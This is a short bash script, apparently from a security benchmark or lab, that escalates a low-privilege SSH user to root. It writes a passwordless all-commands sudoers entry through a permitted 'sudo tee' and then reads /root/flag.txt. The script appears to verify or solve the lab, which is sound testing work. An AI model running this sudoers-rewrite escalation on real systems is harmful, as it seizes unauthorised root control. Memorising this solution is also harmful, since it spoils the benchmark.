#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'echo "lowpriv ALL=(ALL) NOPASSWD: ALL" | sudo -n /usr/bin/tee /etc/sudoers.d/bench-pwn >/dev/null && sudo -n /bin/cat /root/flag.txt')"
assert_root_output "${out}"
